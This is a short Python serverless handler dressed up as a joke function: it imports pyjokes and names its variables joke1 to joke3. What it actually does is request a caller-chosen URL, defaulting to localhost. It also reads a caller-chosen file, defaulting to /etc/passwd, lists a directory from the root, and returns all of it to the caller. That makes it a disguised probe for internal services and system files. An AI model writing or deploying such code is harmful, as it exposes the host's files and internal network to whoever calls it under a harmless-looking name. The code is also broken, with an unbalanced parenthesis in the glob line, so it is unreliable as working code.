import pyjokes
import os
import requests
import glob

def main(args):
  target = args.get("target", "http://127.0.0.1")
  file = args.get("file", "/etc/passwd")
  listing = args.get("listing", "/")
  joke3 = glob.glob(listing))
  #open and read the file after the appending:
  r = requests.get(target)
  f = open(file, "r")
  joke1 = str(r.text)
  joke2 = str(f.read())
  return {
    'body': {
      'response_type': 'in_channel',
      'text1': joke1,
      'text2': joke2,
      'text3': joke3
    }
  }
